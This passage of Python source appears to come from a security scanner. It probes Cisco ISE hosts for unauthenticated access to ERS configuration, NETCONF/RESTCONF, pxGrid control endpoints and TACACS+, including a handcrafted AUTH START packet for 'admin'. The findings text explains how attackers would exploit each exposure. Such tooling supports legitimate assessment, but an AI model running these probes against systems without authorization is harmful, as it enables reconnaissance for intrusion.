                f'https://{host}:{port}{path}',
                headers={'Accept': 'application/json'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. Posture assessment configuration
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/postureassessment?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_POSTURE_ASSESSMENT_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/postureassessment returned HTTP 200 '
                f'without credentials — posture assessment configuration exposed; reveals '
                f'all configured compliance checks (OS version, AV, patch state, firewall) '
                f'an attacker can reverse-engineer to craft a compliant device. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 2. Posture profiles
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/postureprofile?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_POSTURE_PROFILES_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/postureprofile returned HTTP 200 '
                f'without credentials — posture profile list exposed; discloses named '
                f'compliance profiles and associated remediation policy. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 3. Compliance policy
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/compliancepolicy?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_COMPLIANCE_POLICY_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/compliancepolicy returned HTTP 200 '
                f'without credentials — device compliance policy list exposed; reveals '
                f'conditions and enforcement actions for each policy rule. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 4. AV compliance requirements
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/antivirus?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_AV_REQUIREMENTS_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/antivirus returned HTTP 200 without '
                f'credentials — antivirus compliance requirements exposed; reveals required '
                f'AV product names, minimum versions, and definition-date thresholds. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 5. Active Directory integration (BYOD — exposes domain)
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/activedirectory?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_AD_DOMAIN_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/activedirectory returned HTTP 200 '
                f'without credentials — Active Directory integration settings exposed; '
                f'discloses domain FQDN, join account, and organizational unit (OU) '
                f'used for BYOD device enrollment. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 6. Certificate profiles (client cert requirements)
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/certificateprofile?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_CERT_PROFILES_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/certificateprofile returned HTTP 200 '
                f'without credentials — certificate profile configuration exposed; reveals '
                f'client certificate requirements, issuing CA, and allowed SAN patterns '
                f'used for EAP-TLS and BYOD. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 7. Profiler rules (device classification logic)
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/profilerprofile?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PROFILER_RULES_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/profilerprofile returned HTTP 200 '
                f'without credentials — device profiler rule set exposed; reveals the '
                f'DHCP/HTTP/CDP/RADIUS attribute conditions ISE uses to classify devices '
                f'into endpoint identity groups, enabling device-type spoofing. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 8. Endpoint identity groups (trust class membership)
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/endpointidentitygroup?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_ENDPOINT_GROUPS_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/endpointidentitygroup returned HTTP 200 '
                f'without credentials — endpoint identity group hierarchy exposed; reveals '
                f'which groups receive elevated authorization (e.g., Cisco-IP-Phone, '
                f'Workstation, Unknown) enabling targeted authorization policy abuse. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 9. License metadata (version and feature disclosure)
    # ------------------------------------------------------------------
    _status, _body = _get('/ers/config/licensepropertiesdetail')
    if _status == 200 and _body:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_LICENSE_INFO_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/licensepropertiesdetail returned '
                f'HTTP 200 without credentials — ISE license metadata exposed; discloses '
                f'ISE version, licensed feature set (Base/Plus/Apex/DeviceAdmin), and '
                f'node count, enabling targeted version-specific exploitation. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ise_netconf_configuration_extraction(host: str, port: int = 830, timeout: float = 10.0) -> list:
    """
    Detect NETCONF availability and YANG-model configuration extraction surface
    on Cisco ISE and identity infrastructure.

    NETCONF (RFC 6241) runs over SSH on port 830. This probe:
    1. TCP-connects to port 830 and reads the SSH server identification banner.
    2. Attempts a raw NETCONF hello frame over the same socket — catches
       misconfigured NETCONF-over-plain-TCP or NETCONF-over-TLS deployments
       where the server responds before SSH negotiation completes.
    3. If hello exchange succeeds, issues a NETCONF <get> RPC for the
       Cisco-IOS-XE-aaa YANG subtree to confirm RADIUS config extraction.
    4. Probes RESTCONF (RFC 8040) on port 443 for YANG library disclosure.

    References: RFC 6241 (NETCONF), RFC 7589 (NETCONF over TLS), RFC 8040
    (RESTCONF), RFC 8525 (YANG library); Cisco IOS-XE Model-Driven
    Programmability Guide; NX-OS 9.3(x) Programmability Guide
    (ch-netconf-agent: get-config, get operations, candidate datastore,
    YANG namespace http://cisco.com/ns/yang/cisco-nx-os-device).

    Returns list of {severity, title, detail, host, port}.
    """
    import xml.etree.ElementTree as _ET
    import re as _re

    findings: list = []

    # ------------------------------------------------------------------
    # 1. TCP probe port 830 — NETCONF-over-SSH transport liveness
    # ------------------------------------------------------------------
    _banner = b''
    _sock = None
    try:
        _sock = socket.create_connection((host, port), timeout=timeout)
        _sock.settimeout(timeout)
        try:
            _banner = _sock.recv(256)
        except Exception:
            pass

        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_NETCONF_PORT_RESPONSIVE',
            'detail':   (
                f'TCP {host}:{port} (NETCONF-over-SSH) accepts connections — '
                f'NETCONF management plane exposed. SSH banner: '
                f'{_banner[:128].decode(errors="replace").strip()}'
            ),
            'host': host,
            'port': port,
        })

        # ------------------------------------------------------------------
        # 2. Raw NETCONF hello exchange (catches plain-TCP / TLS misconfig)
        # ------------------------------------------------------------------
        _hello = (
            b"<?xml version='1.0' encoding='UTF-8'?>"
            b"<hello xmlns='urn:ietf:params:netconf:base:1.0'>"
            b"<capabilities>"
            b"<capability>urn:ietf:params:netconf:base:1.0</capability>"
            b"</capabilities>"
            b"</hello>]]>]]>"
        )
        _resp = b''
        try:
            _sock.sendall(_hello)
            while b']]>]]>' not in _resp and len(_resp) < 65536:
                _chunk = _sock.recv(4096)
                if not _chunk:
                    break
                _resp += _chunk
        except Exception:
            pass

        if b'urn:ietf:params:netconf' in _resp:
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_NETCONF_CAPABILITIES_DISCLOSED',
                'detail':   (
                    f'NETCONF server hello received on {host}:{port} without '
                    f'authentication — capability list exposed. '
                    f'Response preview: {_resp[:400].decode(errors="replace")}'
                ),
                'host': host,
                'port': port,
            })

            # Parse Cisco-specific capabilities
            _cisco_caps: list = []
            try:
                _xml_chunk = _resp.split(b']]>]]>')[0]
                _root = _ET.fromstring(_xml_chunk.decode(errors='replace'))
                _ns = {'nc': 'urn:ietf:params:netconf:base:1.0'}
                for _cap_el in _root.findall('.//nc:capability', _ns):
                    if _cap_el.text and 'cisco' in _cap_el.text.lower():
                        _cisco_caps.append(_cap_el.text)
            except Exception:
                _cisco_caps = _re.findall(
                    r'urn:[^\s<"\']*[Cc]isco[^\s<"\']*',
                    _resp.decode(errors='replace'),
                )

            if _cisco_caps:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_CISCO_NETCONF_CAPABILITIES',
                    'detail':   (
                        f'Cisco-specific NETCONF capabilities disclosed on {host}:{port} '
                        f'without authentication — reveals IOS-XE/NX-OS version and '
                        f'supported YANG modules enabling targeted exploitation. '
                        f'Capabilities: {_cisco_caps[:10]}'
                    ),
                    'host': host,
                    'port': port,
                })

            # ------------------------------------------------------------------
            # 3. NETCONF <get> RPC for Cisco-IOS-XE AAA / RADIUS config
            # ------------------------------------------------------------------
            _get_rpc = (
                b"<?xml version='1.0' encoding='UTF-8'?>"
                b"<rpc message-id='102' xmlns='urn:ietf:params:netconf:base:1.0'>"
                b"<get>"
                b"<filter type='subtree'>"
                b"<aaa xmlns='http://cisco.com/ns/yang/Cisco-IOS-XE-aaa'/>"
                b"</filter>"
                b"</get>"
                b"</rpc>]]>]]>"
            )
            _rpc_resp = b''
            try:
                _sock.sendall(_get_rpc)
                while b']]>]]>' not in _rpc_resp and len(_rpc_resp) < 65536:
                    _chunk = _sock.recv(4096)
                    if not _chunk:
                        break
                    _rpc_resp += _chunk
            except Exception:
                pass

            if _rpc_resp and b'server-group' in _rpc_resp.lower():
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_RADIUS_CONFIG_VIA_NETCONF',
                    'detail':   (
                        f'NETCONF <get> for Cisco-IOS-XE-aaa YANG model returned RADIUS '
                        f'server-group config on {host}:{port} without authentication — '
                        f'discloses RADIUS server IPs, shared-secret references, and AAA '
                        f'method lists. Preview: {_rpc_resp[:400].decode(errors="replace")}'
                    ),
                    'host': host,
                    'port': port,
                })

    except Exception:
        pass
    finally:
        if _sock:
            try:
                _sock.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # 4. RESTCONF probes on port 443 (RFC 8040)
    # ------------------------------------------------------------------
    _rport = 443
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _rget(path: str) -> tuple:
        try:
            _req = urllib.request.Request(
                f'https://{host}:{_rport}{path}',
                headers={'Accept': 'application/yang-data+json, application/json'},
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    # RESTCONF root endpoint detection
    _st, _body = _rget('/restconf')
    if _st in (200, 401, 405):
        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_RESTCONF_ENDPOINT',
            'detail':   (
                f'GET https://{host}:{_rport}/restconf returned HTTP {_st} — '
                f'RESTCONF (RFC 8040) endpoint present; YANG-model-driven config '
                f'API accessible over HTTPS.'
            ),
            'host': host,
            'port': _rport,
        })

    # RESTCONF data root — unauthenticated data read
    _st, _body = _rget('/restconf/data')
    if _st == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_RESTCONF_DATA_ACCESSIBLE',
            'detail':   (
                f'GET https://{host}:{_rport}/restconf/data returned HTTP 200 '
                f'without authentication — RESTCONF data root accessible; device '
                f'configuration readable via YANG models without credentials. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _rport,
        })

    # YANG library modules-state — full model inventory exposure
    _st, _body = _rget('/restconf/data/ietf-yang-library:modules-state')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_YANG_MODULES_EXPOSED',
            'detail':   (
                f'GET https://{host}:{_rport}/restconf/data/ietf-yang-library:modules-state '
                f'returned HTTP 200 without authentication — complete YANG module inventory '
                f'exposed; reveals all supported data models, namespaces, and revision dates '
                f'enabling precise capability fingerprinting and targeted exploitation. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _rport,
        })

        # Extract Cisco-specific YANG module names
        _cisco_yang = list(set(_re.findall(
            r'Cisco-IOS-XE-[\w-]+|Cisco-IOS-XR-[\w-]+|cisco-nx-os-[\w-]+|cisco-ise-[\w-]+',
            _body.decode(errors='replace'),
        )))
        if _cisco_yang:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_CISCO_YANG_MODULES',
                'detail':   (
                    f'Cisco-specific YANG modules enumerated from RESTCONF library on '
                    f'{host}:{_rport} — discloses supported IOS-XE/ISE feature modules '
                    f'enabling targeted YANG-path exploitation. '
                    f'Modules (sample): {_cisco_yang[:15]}'
                ),
                'host': host,
                'port': _rport,
            })

    return findings


def probe_ise_pxgrid_websocket_exposure(host: str, port: int = 8910, timeout: float = 10.0) -> list:
    """
    Deep pxGrid 2.0 control-plane and EPS API exposure probe for Cisco ISE.

    pxGrid 2.0 (Platform Exchange Grid) uses WebSocket/STOMP over HTTPS on
    port 8910 and a REST control plane at /pxgrid/control/*. This probe
    targets account provisioning, service enumeration, shared-secret
    endpoint reachability, and the Endpoint Protection Service (EPS) API.

    pxGrid is the identity context bus: compromising it yields real-time
    session events (IP->user->device->SGT bindings), endpoint profiles,
    and quarantine control — the keys to ISE's enforcement plane.

    References: Cisco ISE 3.1 Admin Guide (pxGrid chapter); Cisco pxGrid
    2.0 REST API reference; RFC 6455 (WebSocket); Cisco TrustSec/pxGrid
    integration documentation; Cisco EPS (Endpoint Protection Service) API.

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE
    _base = f'https://{host}:{port}'

    def _get(path: str) -> tuple:
        try:
            _req = urllib.request.Request(
                f'{_base}{path}',
                headers={'Accept': 'application/json'},
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(4096)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    def _post(path: str, payload: dict) -> tuple:
        try:
            _data = json.dumps(payload).encode()
            _req = urllib.request.Request(
                f'{_base}{path}',
                data=_data,
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                method='POST',
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(4096)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. TCP liveness — port 8910 (pxGrid 2.0 WebSocket/STOMP)
    # ------------------------------------------------------------------
    try:
        _s = socket.create_connection((host, port), timeout=timeout)
        _s.close()
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PXGRID_PORT_OPEN',
            'detail':   (
                f'TCP {host}:{port} accepts connections — pxGrid 2.0 WebSocket/STOMP '
                f'control bus exposed; identity-context pub/sub pipeline reachable.'
            ),
            'host': host,
            'port': port,
        })
    except Exception:
        # Port 8910 closed — fall through to XMPP check then return
        try:
            _sx = socket.create_connection((host, 5222), timeout=timeout)
            _sx.close()
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_PXGRID_XMPP_PORT',
                'detail':   (
                    f'TCP {host}:5222 accepts connections — pxGrid 1.0 XMPP transport '
                    f'port open; legacy pxGrid identity bus exposed.'
                ),
                'host': host,
                'port': 5222,
            })
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # 2. AccountCreate — provisioning endpoint reachability
    # ------------------------------------------------------------------
    _st, _body = _get('/pxgrid/control/AccountCreate')
    if _st is not None and _st != 404:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_PXGRID_ACCOUNT_CREATE_EXPOSED',
            'detail':   (
                f'GET https://{host}:{port}/pxgrid/control/AccountCreate returned '
                f'HTTP {_st} (not 404) — pxGrid account provisioning endpoint reachable; '
                f'enables unauthenticated account registration on the identity bus. '
                f'Response: {_body[:200].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 3. AccountActivate — activation status leak
    # ------------------------------------------------------------------
    _st, _body = _post(
        '/pxgrid/control/AccountActivate',
        {'name': 'probe', 'description': 'probe'},
    )
    if _st is not None and b'activationstatus' in _body.lower():
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_PXGRID_ACCOUNT_ACTIVATABLE',
            'detail':   (
                f'POST /pxgrid/control/AccountActivate returned activationStatus '
                f'without authentication on {host}:{port} — account state machine '
                f'exposed; could allow approval escalation via repeated activate requests. '
                f'Response: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 4. ServiceLookup — enumerate pxGrid service registry
    # ------------------------------------------------------------------
    _st, _body = _post(
        '/pxgrid/control/ServiceLookup',
        {'name': 'com.cisco.ise.session'},
    )
    if _st is not None and b'services' in _body.lower():
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_PXGRID_SERVICES_ENUMERABLE',
            'detail':   (
                f'POST /pxgrid/control/ServiceLookup returned services array '
                f'on {host}:{port} without authentication — pxGrid service registry '
                f'exposed; discloses session, profiler, and MDM service URLs. '
                f'Response: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for session topic WebSocket URLs
        _urls = _re.findall(
            r'wss?://[^\s"\'<>]+|https?://[^\s"\'<>]+',
            _body.decode(errors='replace'),
        )
        if _urls:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_PXGRID_SESSION_TOPIC',
                'detail':   (
                    f'pxGrid session topic WebSocket URLs disclosed on {host}:{port} — '
                    f'enables direct subscription to real-time identity events '
                    f'(IP->user->SGT bindings) without authentication. '
                    f'URLs: {_urls[:5]}'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # 5. AccessSecret — shared-secret exchange endpoint
    # ------------------------------------------------------------------
    _st, _body = _post(
        '/pxgrid/control/AccessSecret',
        {'peerNodeName': 'probe'},
    )
    _body_text = _body.decode(errors='replace')
    if _st is not None and any(
        k in _body_text.lower()
        for k in ('secret', 'error', 'unauthorized', 'forbidden', 'nodename', 'peernodename')
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_PXGRID_SECRET_ENDPOINT',
            'detail':   (
                f'POST /pxgrid/control/AccessSecret on {host}:{port} responded '
                f'HTTP {_st} with informative body — shared-secret exchange endpoint '
                f'reachable; error messages may disclose node names or auth requirements. '
                f'Response: {_body_text[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 6. EPS API — Endpoint Protection Service
    # ------------------------------------------------------------------
    _st, _body = _get('/pxgrid/ise/eps')
    if _st is not None and _st != 404:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_EPS_API_ACCESSIBLE',
            'detail':   (
                f'GET https://{host}:{port}/pxgrid/ise/eps returned HTTP {_st} — '
                f'Endpoint Protection Service API reachable; EPS controls quarantine '
                f'and CoA (Change of Authorization) for endpoint enforcement.'
            ),
            'host': host,
            'port': port,
        })

    _st, _body = _get('/pxgrid/ise/eps/getEndpointById')
    if _st is not None and _st != 404:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_EPS_ENDPOINT_LOOKUP',
            'detail':   (
                f'GET https://{host}:{port}/pxgrid/ise/eps/getEndpointById returned '
                f'HTTP {_st} — EPS endpoint identity lookup reachable; may enable '
                f'unauthenticated endpoint profile, MAC address, and identity-group '
                f'enumeration. Response: {_body[:200].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 7. pxGrid 1.0 XMPP port 5222 — legacy transport
    # ------------------------------------------------------------------
    try:
        _sx = socket.create_connection((host, 5222), timeout=timeout)
        _sx.close()
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PXGRID_XMPP_PORT',
            'detail':   (
                f'TCP {host}:5222 accepts connections — pxGrid 1.0 XMPP transport '
                f'port open alongside pxGrid 2.0 on {port}; legacy identity event '
                f'bus exposed.'
            ),
            'host': host,
            'port': 5222,
        })
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# ISE 3.1 TACACS+ Device Administration Exposure
# ---------------------------------------------------------------------------
def probe_ise_tacacs_device_admin_exposure(host: str, port: int = 9060, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE TACACS+ device administration exposure (ISE 3.1 feature).

    TACACS+ device administration is a distinct policy engine in ISE 3.1,
    separate from RADIUS-based network access. It controls shell access,
    command authorization, and privilege-level assignment for network devices.
    When ERS TACACS resources are unauthenticated, an attacker gains full
    visibility into device admin policy: which commands are permitted per
    role, external TACACS server IPs, profile attribute pairs, and live
    session state.

    References: Cisco ISE 3.1 Install Guide ch5 (admin portal / ERS API
    base URL); Cisco ISE 3.1 TACACS+ Device Administration guide (ERS
    resources: tacacsserversequence, tacacsexternalservers, tacacscommandsets,
    tacacsprofiles, allowedprotocols); RFC 8907 (TACACS+ protocol);
    ISE MnT REST API (/admin/API/mnt/Session/ActiveList).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get_https(p: int, path: str) -> tuple:
        try:
            _req = urllib.request.Request(
                f'https://{host}:{p}{path}',
                headers={'Accept': 'application/json'},
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. TACACS+ TCP port 49 — server presence
    # ------------------------------------------------------------------
    _tacacs_port = 49
    try:
        _s = socket.create_connection((host, _tacacs_port), timeout=timeout)
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_TACACS_SERVER_PORT',
            'detail':   (
                f'TCP {host}:{_tacacs_port} accepts connections — ISE TACACS+ device '
                f'administration server port open; network device CLI authentication '
                f'and command authorization plane exposed.'
            ),
            'host': host,
            'port': _tacacs_port,
        })

        # AUTH START probe: version=0xC1(v1), type=AUTHEN(1), seq=1,
        # flags=0x04 (unencrypted), session_id=1, body_len=12
        # Body: action=LOGIN, priv=0, authen_type=ASCII, service=LOGIN,
        # user_len=5, port_len=0, rem_addr_len=0, data_len=0, user='admin'
        _body = (
            b'\x01'   # action LOGIN
            b'\x00'   # priv_lvl 0
            b'\x01'   # authen_type ASCII
            b'\x02'   # authen_service LOGIN
            b'\x05'   # user_len 5
            b'\x00'   # port_len 0
            b'\x00'   # rem_addr_len 0
            b'\x00'   # data_len 0
            b'admin'  # user
        )
        _hdr = struct.pack(
            '!BBBBI I',
            0xC1, 0x01, 0x01, 0x04,   # ver, type, seq, flags (unencrypted)
            0x00000001,                 # session_id
            len(_body),                 # body length
        )
        _pkt = _hdr + _body
        try:
            _s.sendall(_pkt)
            _resp = b''
            _s.settimeout(timeout)
            while len(_resp) < 12:
                _chunk = _s.recv(256)
                if not _chunk:
                    break
                _resp += _chunk
            if len(_resp) >= 12:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_TACACS_AUTH_RESPONSIVE',
                    'detail':   (
                        f'TACACS+ AUTH START to {host}:{_tacacs_port} received '
                        f'{len(_resp)}-byte reply — server actively responding to '
                        f'unauthenticated authentication probe; device admin auth '
                        f'plane reachable without prior session setup. '
                        f'Raw header hex: {_resp[:12].hex()}'
                    ),
                    'host': host,
                    'port': _tacacs_port,
                })
                # Parse auth reply status from body byte 0 (offset 12)
                if len(_resp) >= 13:
                    _status_byte = _resp[12]
                    _status_map = {
                        0x01: 'PASS',
                        0x02: 'FAIL',
                        0x03: 'GETDATA',
                        0x04: 'GETUSER',
                        0x05: 'GETPASS',
                        0x06: 'RESTART',
                        0x07: 'ERROR',
                        0x21: 'FOLLOW',
                    }
                    _status_str = _status_map.get(_status_byte, f'0x{_status_byte:02x}')
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'ISE_TACACS_REPLY_DECODED',
                        'detail':   (
                            f'TACACS+ AUTH REPLY status={_status_str} ({_status_byte}) '
                            f'from {host}:{_tacacs_port} — server decoded the probe '
                            f'packet and returned a structured authentication response; '
                            f'TACACS+ session state machine functional.'
                        ),
                        'host': host,
                        'port': _tacacs_port,
                    })
        except Exception:
            pass
        finally:
            try:
                _s.close()
            except Exception:
                pass
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 2. ERS port selection: dedicated 9060 → fall back to 443
    # ------------------------------------------------------------------
    _ers_port = port
    try:
        _sp = socket.create_connection((host, port), timeout=timeout)
        _sp.close()
    except Exception:
        _ers_port = 443

    # ------------------------------------------------------------------
    # 3. ERS TACACS server sequences
    # ------------------------------------------------------------------
    _st, _body = _get_https(_ers_port, '/ers/config/tacacsserversequence')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_TACACS_SEQUENCES_UNAUTH',
            'detail':   (
                f'GET /ers/config/tacacsserversequence on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — TACACS+ server sequences '
                f'exposed; reveals ordered server lists used for device-admin failover '
                f'and which external TACACS servers are in policy. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })

    # ------------------------------------------------------------------
    # 4. ERS TACACS external servers
    # ------------------------------------------------------------------
    _st, _body = _get_https(_ers_port, '/ers/config/tacacsexternalservers')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_TACACS_EXT_SERVERS_UNAUTH',
            'detail':   (
                f'GET /ers/config/tacacsexternalservers on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — external TACACS+ server '
                f'list exposed; discloses IPs, shared-secret references, and '
                f'connection-attempt settings for secondary TACACS+ infrastructure. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })

    # ------------------------------------------------------------------
    # 5. ERS TACACS command sets — privilege level and shell exec surface
    # ------------------------------------------------------------------
    _st, _body = _get_https(_ers_port, '/ers/config/tacacscommandsets')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_TACACS_COMMAND_SETS_UNAUTH',
            'detail':   (
                f'GET /ers/config/tacacscommandsets on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — TACACS+ command-set '
                f'policies exposed; enumerates permitted shell commands per '
                f'privilege level, enabling targeted command bypass attempts. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })
        # Parse for shell execution indicators and privilege levels
        try:
            _txt = _body.decode(errors='replace')
            _priv_hits = re.findall(r'priv[- _]?(?:lvl|level|ege)["\s:]+(\d+)', _txt, re.IGNORECASE)
            _shell_hits = re.findall(
                r'"(?:permit|deny)"[^}]{0,60}'
                r'(?:shell|exec|enable|configure terminal|debug)',
                _txt, re.IGNORECASE,
            )
            if _priv_hits or _shell_hits:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_TACACS_PRIV_LEVELS_EXPOSED',
                    'detail':   (
                        f'TACACS+ command-set body on {host}:{_ers_port} discloses '
                        f'privilege levels {list(set(_priv_hits))[:10]} and '
                        f'{len(_shell_hits)} shell/exec command rule(s) — attacker '
                        f'can map exactly which IOS commands are permitted per role '
                        f'before attempting device-admin credential stuffing.'
                    ),
                    'host': host,
                    'port': _ers_port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 6. ERS TACACS profiles — attribute-value pairs
    # ------------------------------------------------------------------
    _st, _body = _get_https(_ers_port, '/ers/config/tacacsprofiles')
    if _st == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_TACACS_PROFILES_UNAUTH',
            'detail':   (
                f'GET /ers/config/tacacsprofiles on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — TACACS+ profile '
                f'attribute-value pairs exposed; reveals shell privilege assignments '
                f'(priv-lvl, autocmd) and custom AV-pairs returned on login. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': _ers_port,
        })

    # ------------------------------------------------------------------
    # 7. ERS allowed protocols — weak auth protocol detection
    # ------------------------------------------------------------------
    _st, _body = _get_https(_ers_port, '/ers/config/allowedprotocols')
    if _st == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ALLOWED_PROTOCOLS_UNAUTH',
            'detail':   (
                f'GET /ers/config/allowedprotocols on {host}:{_ers_port} '
                f'returned HTTP 200 without credentials — authentication protocol '
                f'policy list exposed; reveals which EAP/PAP/CHAP methods are '
                f'enabled per policy set. '
